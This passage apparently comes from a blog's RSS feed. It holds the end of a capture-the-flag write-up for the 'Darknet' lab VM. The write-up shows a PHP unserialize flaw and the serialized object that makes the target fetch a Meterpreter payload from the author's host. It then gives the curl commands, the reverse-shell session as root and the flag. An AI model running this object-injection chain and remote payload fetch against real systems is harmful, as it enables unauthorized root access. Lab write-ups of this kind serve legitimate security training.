+meterpreter &amp;gt; sysinfo 
+Computer    : Darknet
+OS          : Linux Darknet 3.2.0-4-486 #1 Debian 3.2.65-1+deb7u2 i686
+Meterpreter : php/php
+meterpreter &amp;gt; getuid 
+Server username: errorlevel (1002)
+
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h2 id=&#34;the-final-dark-hurdle:ce3f29a7309c858ac5469dc7533e0e59&#34;&gt;The Final Dark Hurdle&lt;/h2&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;
+Listing: /var/www
+=================
+
+Mode              Size  Type  Last modified              Name
+----              ----  ----  -------------              ----
+40755/rwxr-xr-x   4096  dir   2015-04-26 15:22:35 +0100  Classes
+40755/rwxr-xr-x   4096  dir   2015-04-26 16:07:45 +0100  access
+100644/rw-r--r--  378   fil   2015-03-23 06:10:38 +0000  index.html
+100644/rw-r--r--  157   fil   2015-04-26 15:21:11 +0100  sec.php
+
+Listing: /var/www/Classes
+=========================
+
+Mode              Size  Type  Last modified              Name
+----              ----  ----  -------------              ----
+100644/rw-r--r--  163   fil   2015-04-26 15:22:35 +0100  Show.php
+100644/rw-r--r--  319   fil   2015-04-26 15:27:16 +0100  Test.php
+
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h4 id=&#34;sec-php:ce3f29a7309c858ac5469dc7533e0e59&#34;&gt;sec.php&lt;/h4&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;
+&amp;lt;?php
+
+require &amp;quot;Classes/Test.php&amp;quot;;
+require &amp;quot;Classes/Show.php&amp;quot;;
+
+if(!empty($_POST[&#39;test&#39;])){
+    $d=$_POST[&#39;test&#39;];
+    $j=unserialize($d);
+    echo $j;
+}
+?&amp;gt;
+
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h4 id=&#34;test-php:ce3f29a7309c858ac5469dc7533e0e59&#34;&gt;Test.php&lt;/h4&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;
+&amp;lt;?php
+
+class Test {
+
+    public $url;
+    public $name_file;
+    public $path;
+
+    function __destruct(){
+        $data=file_get_contents($this-&amp;gt;url);
+        $f=fopen($this-&amp;gt;path.&amp;quot;/&amp;quot;.$this-&amp;gt;name_file, &amp;quot;w&amp;quot;);
+        fwrite($f, $data);
+        fclose($f);
+        chmod($this-&amp;gt;path.&amp;quot;/&amp;quot;.$this-&amp;gt;name_file, 0644);
+}
+}
+
+?&amp;gt;
+
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;#### Show.php&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;
+&amp;lt;?php
+
+class Show {
+
+    public $woot;
+
+    function __toString(){
+        return &amp;quot;Showme&amp;quot;;        
+
+}
+    function Pwnme(){
+        $this-&amp;gt;woot=&amp;quot;ROOT&amp;quot;;
+
+}
+
+}
+
+?&amp;gt;
+
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;So the story here is fairly self explanatory - we need to POST a serialised string to &lt;code&gt;sec.php&lt;/code&gt;, which is passed to &lt;code&gt;Test.php&lt;/code&gt; and &lt;code&gt;Show.php&lt;/code&gt;.  The end result is that a new file can be written to &lt;code&gt;/var/www&lt;/code&gt; and have it &lt;code&gt;chmod&#39;d&lt;/code&gt; to set &lt;code&gt;root&lt;/code&gt; as owner.  Given we are using &lt;code&gt;suphp&lt;/code&gt;, this will also execute as root and give us a root shell.&lt;/p&gt;
+
+&lt;p&gt;I generated placed a PHP Meterpreter payload into my &lt;code&gt;/var/www&lt;/code&gt; folder, named it &lt;code&gt;root&lt;/code&gt; and started &lt;code&gt;apache2&lt;/code&gt;.&lt;/p&gt;
+
+&lt;h2 id=&#34;serialization:ce3f29a7309c858ac5469dc7533e0e59&#34;&gt;Serialization&lt;/h2&gt;
+
+&lt;p&gt;First checked my serialization was working, using the &lt;code&gt;Show&lt;/code&gt; class.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;
+&amp;lt;?php
+
+class Show {
+
+        public $woot = &amp;quot;woot&amp;quot;;
+
+}
+
+print serialize(new Show);
+
+?&amp;gt;
+
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;
+# php pwn.php 
+O:4:&amp;quot;Show&amp;quot;:1:{s:4:&amp;quot;woot&amp;quot;;s:4:&amp;quot;woot&amp;quot;;}
+
+# curl 192.168.56.102/sec.php -d &#39;test=O:4:&amp;quot;Show&amp;quot;:1:{s:4:&amp;quot;woot&amp;quot;;s:4:&amp;quot;woot&amp;quot;;}&#39;
+Showme
+
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;So, that&amp;rsquo;s all good.  Now we just need to add in the &lt;code&gt;Test&lt;/code&gt; class with my desired values.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;
+&amp;lt;?php
+
+class Test {
+
+        public $url = &amp;quot;http://192.168.56.101/root&amp;quot;;
+        public $name_file = &amp;quot;root.php&amp;quot;;
+        public $path = &amp;quot;/var/www&amp;quot;;
+
+}
+
+class Show {
+
+        public $woot = &amp;quot;woot&amp;quot;;
+
+}
+
+$_test = (new Test);
+$_show = (new Show);
+
+print serialize(array($_test, $_show));
+
+?&amp;gt;
+
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;
+# php pwn.php 
+a:2:{i:0;O:4:&amp;quot;Test&amp;quot;:3:{s:3:&amp;quot;url&amp;quot;;s:26:&amp;quot;http://192.168.56.101/root&amp;quot;;s:9:&amp;quot;name_file&amp;quot;;s:8:&amp;quot;root.php&amp;quot;;s:4:&amp;quot;path&amp;quot;;s:8:&amp;quot;/var/www&amp;quot;;}i:1;O:4:&amp;quot;Show&amp;quot;:1:{s:4:&amp;quot;woot&amp;quot;;s:4:&amp;quot;woot&amp;quot;;}}
+
+# curl 192.168.56.102/sec.php -d &#39;test=a:2:{i:0;O:4:&amp;quot;Test&amp;quot;:3:{s:3:&amp;quot;url&amp;quot;;s:26:&amp;quot;http://192.168.56.101/root&amp;quot;;s:9:&amp;quot;name_file&amp;quot;;s:8:&amp;quot;root.php&amp;quot;;s:4:&amp;quot;path&amp;quot;;s:8:&amp;quot;/var/www&amp;quot;;}i:1;O:4:&amp;quot;Show&amp;quot;:1:{s:4:&amp;quot;woot&amp;quot;;s:4:&amp;quot;woot&amp;quot;;}}&#39;
+
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Monitoring my Apache access log, I can see a GET request - a good sign!&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;
+# tail -f /var/log/apache2/access.log 
+192.168.56.102 - - [13/Jun/2015:11:56:45 +0100] &amp;quot;GET /root HTTP/1.0&amp;quot; 200 1546 &amp;quot;-&amp;quot; &amp;quot;-&amp;quot;
+
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;So, time to fire up my &lt;code&gt;multi/handler&lt;/code&gt; again&amp;hellip;&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;
+msf exploit(handler) &amp;gt; exploit 
+
+[*] Started reverse handler on 192.168.56.101:4444 
+[*] Starting the payload handler...
+
+# curl http://192.168.56.102/root.php
+
+[*] Sending stage (40499 bytes) to 192.168.56.102
+[*] Meterpreter session 3 opened (192.168.56.101:4444 -&amp;gt; 192.168.56.102:41202) at 2015-06-13 12:05:52 +0100
+
+meterpreter &amp;gt; sysinfo 
+Computer    : Darknet
+OS          : Linux Darknet 3.2.0-4-486 #1 Debian 3.2.65-1+deb7u2 i686
+Meterpreter : php/php
+meterpreter &amp;gt; getuid 
+Server username: root (0)
+
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Quick, grab dat flag!&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;
+meterpreter &amp;gt; cat /root/flag.txt
+      ___           ___           ___           ___           ___           ___           ___     
+     /\  \         /\  \         /\  \         /\__\         /\__\         /\  \         /\  \    
+    /::\  \       /::\  \       /::\  \       /:/  /        /::|  |       /::\  \        \:\  \   
+   /:/\:\  \     /:/\:\  \     /:/\:\  \     /:/__/        /:|:|  |      /:/\:\  \        \:\  \  
+  /:/  \:\__\   /::\~\:\  \   /::\~\:\  \   /::\__\____   /:/|:|  |__   /::\~\:\  \       /::\  \ 
+ /:/__/ \:|__| /:/\:\ \:\__\ /:/\:\ \:\__\ /:/\:::::\__\ /:/ |:| /\__\ /:/\:\ \:\__\     /:/\:\__\
+ \:\  \ /:/  / \/__\:\/:/  / \/_|::\/:/  / \/_|:|~~|~    \/__|:|/:/  / \:\~\:\ \/__/    /:/  \/__/
+  \:\  /:/  /       \::/  /     |:|::/  /     |:|  |         |:/:/  /   \:\ \:\__\     /:/  /     
+   \:\/:/  /        /:/  /      |:|\/__/      |:|  |         |::/  /     \:\ \/__/     \/__/      
+    \::/__/        /:/  /       |:|  |        |:|  |         /:/  /       \:\__\                  
+     ~~            \/__/         \|__|         \|__|         \/__/         \/__/                 
+
+
+
+     Sabia que podias Campeon!, espero que esta VM haya sido de tu agrado y te hayas divertido
+     tratando de llegar hasta aca. Eso es lo que realmente importa!.
+
+
+#Blog: www.securitysignal.org
+
+#Twitter: @SecSignal, @q3rv0
+
+&lt;/code&gt;&lt;/pre&gt;
+</description>
+    </item>
+    
+  </channel>
+</rss>
